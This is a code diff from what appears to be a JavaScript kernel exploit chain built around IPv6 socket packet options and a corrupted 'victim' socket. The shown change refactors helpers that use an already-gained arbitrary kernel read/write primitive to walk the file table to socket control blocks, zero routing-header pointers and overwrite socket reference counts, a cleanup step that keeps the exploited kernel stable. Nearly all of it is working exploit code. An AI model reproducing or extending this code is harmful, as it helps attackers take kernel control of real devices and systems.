@@ -1488,23 +1488,25 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  
 
  
- 
-function inline_get_socket(fd) {
-  
-  const file_ptr = ofiles.readp(fd * SIZEOF_OFILES);
-  return file_ptr.readp(0);
+function get_sock_pktopts(fd) {
+  const sock = get_fd_data_addr(fd);             
+  const pcb  = kmem.readp(sock.add(SO_PCB));    
+  return kmem.readp(pcb.add(INPCB_PKTOPTS));     
 }
-
+function get_fd_data_addr(fd) {
+  
+  const slot = ofiles.add(fd * SIZEOF_OFILES);
+  const filep = kmem.readp(slot);    
+  return kmem.readp(filep);          
+}
  try{
 
-for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
-  const sock = inline_get_socket(sd);
-  const pcb  = sock.readp(SO_PCB);
-  const pktopts = pcb.readp(INPCB_PKTOPTS);
-  kmem.write64(pktopts.add(off_ip6po_rthdr), 0);
+ for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
+  const pkto = get_sock_pktopts(sd);
+  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
 }
 
-     const sock_increase_ref = [
+const sock_increase_ref = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
   main_sd,
@@ -1513,10 +1515,9 @@ for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
 ];
 
 for (let sd of sock_increase_ref) {
-  const sock = inline_get_socket(sd);
-  kmem.write32(sock, 0x100);
+  const sock_addr = get_fd_data_addr(sd);
+  kmem.write32(sock_addr, 0x100);
 }
-     
     log("full restore of pktopts and sock refcounts complete");
  }
     catch(e){
